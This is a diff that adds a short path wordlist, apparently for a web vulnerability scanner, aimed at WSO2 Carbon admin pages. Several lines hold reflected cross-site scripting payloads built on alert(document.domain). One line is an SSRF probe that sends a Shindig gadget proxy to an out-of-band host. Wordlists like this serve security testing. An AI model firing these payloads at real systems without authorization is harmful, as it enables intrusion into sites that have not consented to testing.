@@ -1,0 +1,6 @@
+/carbon/admin/login.jsp
+/services/Version
+/carbon/resources/add_collection_ajaxprocessor.jsp?collectionName=%3Cimg%20src=x%20onerror=alert(document.domain)%3E&parentPath=%3Cimg%20src=x%20onerror=alert(document.domain)%3E
+/carbon/admin/login.jsp?msgId=%27%3Balert(%27document.domain%27)%2F%2F
+/carbon/admin/login.jsp?loginStatus=false&errorCode=%27);alert(document.domain)//
+/shindig/gadgets/proxy?container=default&url=http://oast.pro
